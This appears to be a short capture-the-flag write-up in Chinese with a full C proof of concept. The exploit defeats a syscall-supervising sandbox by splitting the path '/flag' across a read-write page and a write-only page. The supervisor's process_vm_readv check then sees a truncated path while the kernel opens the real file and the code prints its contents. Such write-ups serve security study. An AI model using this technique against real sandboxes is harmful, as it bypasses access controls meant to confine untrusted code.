## 为什么要打开 /flag 😡

映射两个内存页，第一个页面为 `rw`，第二个页面为 `-w`。将 `/flag` 跨在两个页面上，`process_vm_readv` 只能读 `r` 页，导致 Supervisor 读到的 path 被截断。而内核只要页面不是 `PROT_NONE` 都可以接受，所以在内核视角下看到的将是完整的 `/flag` 路径

```c
#include <fcntl.h>
#include <sys/mman.h>

int my_errno;
#define SYS_ERRNO my_errno

#include "linux_syscall_support.h"

int _start() {
    int size = 4096;

    char * addr = (char*) sys_mmap(NULL, 2*size, PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
    *(addr + size - 1) = '/';
    *(addr + size - 0) = 'f';
    *(addr + size + 1) = 'l';
    *(addr + size + 2) = 'a';
    *(addr + size + 3) = 'g';
    *(addr + size + 4) = '\0';

    sys_mprotect(addr + size, size, PROT_WRITE) == -1;

    int fd = sys_open(addr + size - 1, O_RDONLY, O_CLOEXEC);
    char buf[64];
    sys_read(fd, buf, 64);
    sys_write(1, buf, 64);

    return 0;
}
```
